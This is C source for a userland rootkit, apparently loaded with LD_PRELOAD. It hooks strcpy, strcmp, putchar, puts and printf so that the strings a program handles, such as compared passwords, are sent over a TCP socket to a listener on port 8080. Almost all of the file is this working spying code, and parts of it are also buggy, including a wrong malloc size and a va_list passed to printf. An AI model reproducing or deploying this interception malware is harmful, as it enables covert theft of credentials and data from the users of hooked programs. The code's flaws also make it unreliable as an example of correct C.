#include "Rootkit.h"
#include <stdarg.h>
#include <dlfcn.h>
#include <stdarg.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>

#define LIBC "/lib/x86_64-linux-gnu/libc.so.6"

#define PORT 8080
#define SA struct sockaddr

void sendData(const char* data, int newline){
    // copy data to new string
    char* copiedData = malloc(strlen(data) + (newline) ? 1 : 0);
    copy(copiedData, data);

    int sockfd;
    struct sockaddr_in servaddr;

    // socket create and varification
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        return;
    }
    
    bzero(&servaddr, sizeof(servaddr));
   
    // assign IP, PORT
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    servaddr.sin_port = htons(PORT);
   
    // connect the client socket to server socket
    if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) {
        return;
    }

    // append a newline character to copied data
    int size = strlen(copiedData);
    if (newline) {
        copiedData[size] = '\n';
        copiedData[++size] = '\0';
    }
    
    // send line here
    send(sockfd, copiedData, size, 0);
   
    // close the socket
    close(sockfd);

    // free copied data
    free(copiedData);
}

void copy(char* destination, const char* source){
    int i;
    for (i = 0; source[i] != '\0'; ++i) {
        destination[i] = source[i];
    }

    destination[i] = '\0';
}

char* strcpy(char* destination, const char* source){
    copy(destination, source);

    sendData("strcpy", 1);
    sendData("destination: ", 0);
    sendData(destination, 1);

    return destination;
}

int strcmp(const char *str1, const char *str2){
    sendData("strcmp", 1);
    sendData("Str1: ", 0);
    sendData(str1, 1);
    sendData("Str2: ", 0);
    sendData(str2, 1);

    while (*str1) {
        if (*str1 != *str2) {
            break;
        }
        str1++;
        str2++;
    }
    return *str1 - *str2;
}

int putchar(int ch){
    write(1, &ch, 1);

    sendData((void*)&ch, 0);

    return (unsigned char)ch;
}

int puts(const char *str){
    sendData(str, 0);

    return write(1, str, strlen(str));
}

int printf(const char *format, ...){

    // copy original printf
    int (*func)(const char *format, ...) = 
        dlsym(
            dlopen(LIBC, RTLD_NOW),
            "printf");

    // send
    sendData(format, 1);

    // get count of arguments in printf
    int count = 0;
    char ch = format[count];
    for (int i = 0; ch != '\0'; i++) {
        if(format[i] == '%')
            count++;
        ch = format[i];
    }

    va_list arg;
    va_start(arg, format);

    // call orginal function
    int result = func(format, arg);

    // iterate through arguments
    for (int i = 0; i < count; i++) {
        sendData("Argument --- ", 0);
        sendData(va_arg(arg, const char*), 1);
    }

    va_end(arg);

    return result;
}